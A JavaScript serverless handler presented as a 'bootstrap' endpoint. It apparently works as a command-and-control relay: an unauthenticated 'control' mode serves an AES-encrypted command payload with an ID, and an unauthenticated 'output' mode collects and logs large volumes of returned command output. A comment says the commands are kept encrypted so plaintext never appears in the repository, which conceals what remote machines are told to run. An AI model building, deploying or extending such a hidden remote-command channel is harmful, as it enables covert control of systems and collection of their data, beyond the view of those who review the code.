import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';

// These two values are updated temporarily while the owner's server is being configured.
// The command body is always AES-256 encrypted with a secret generated on the VPS;
// plaintext commands are never committed to this repository.
const CONTROL_ID = '3';
const CONTROL_PAYLOAD = 'U2FsdGVkX1/F/N/y6rjyvhoiCw3yfQZphkZJZAjB5eRQPdkQVDo31DM4KEAYnsQyd6nZs8nIgeXA4Qu8QQLsndHevU3UukFUwx6+USJJl1bNzCDDSYjxUKeZu0FG0qn9GrP4DXe0be6IDO4lzwkFOIF7OTtLZXU6b0xdbgSitLccytWVWtBgGpE9CyJKgQ9nxFsO/KBaqtoB9EDeuJu7/ZdhrS9c1AYEfisLHFmLx6949W3BrA9dZwfAlkF1TQleb+DgYBSkCB/D2ZMHSXcr3BMNhfobWnrKLKz4QLQ6C14uWhNneGZHPsggeRyGzqsg+APeHoIDQ7Uiqw20pZoMJpok+gltqi7ttmGD1U02/IrMq1caTjMrleuJWCIdvf+liTPlULwnW5NhV+K5J1n/lU3xrGK2CMFuVmZ+LL4cN/QoQVXfoavAgtpK9LcaTBmIjuy26laaWCaj8w5yAGlwvVrTSpeIw34q7uVTekZ71PDsNIAFtavBRVs8JUvHiP2Fi9mmHhwyMjtC2P2FuhyM1xTtxSyPpPm43wluZf6Nj+jRZx9p6dwCGoNgtleIwQG4oPzb2WpfOkSmvRnr6yZk33W0gQgNdHV7wFPClg7+Nf0CL77DFE8xy0kEAncIdPp0vcqpHH9HdfPBmHJJPQu5LXwKpFzyDKhHS080XVatVuJpMhRALtbH6ZHxwF8zLPAboeXkh2DN0W8hxOx1BeKpFY/0cYYKrKk1sSwkoMvkPCrpVIKfkLCefmOTeGQQWOTGsMT64Ec4XhFtOQ42laGLwN8ghLv1JoErNisduFXDB/fnXfMADMffs9VqI+/3DYOWtj4OwcX0Qw3fz2iLDZdwXVIXsDJvwzAA7RzFw4IZKiquLze/8BTSt0EHeOe/u+67rKxr8rqpmPwu11bjgEZPaPFQx0C4lahMWzYNsHJ30v/s74M1ME7UJZBPbgx13Yd5id3ZoKLcjKtznx87DYIcIc/yWjEoPZ2MwjE+V2t/Y2eDYPcu/WkKYZzVtoBJJIjBTyAKImB/goL0+FSrW9yt1ci9luxd2WiB/5HTPRd9QIJKr6LRai1U1csv8YQkWl+lQDrhrkcdnSoH47ymRJyy98rxF3uRk6vgIzb3x39G2VI=';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);

  const chunks = [];
  for await (const chunk of request) {
    chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  }
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');

  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) {
      return response.status(404).send('Not found');
    }
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }

  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }

  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_OUTPUT ${body.slice(0, 200000)}`);
    return response.status(204).end();
  }

  return response.status(404).send('Not found');
}
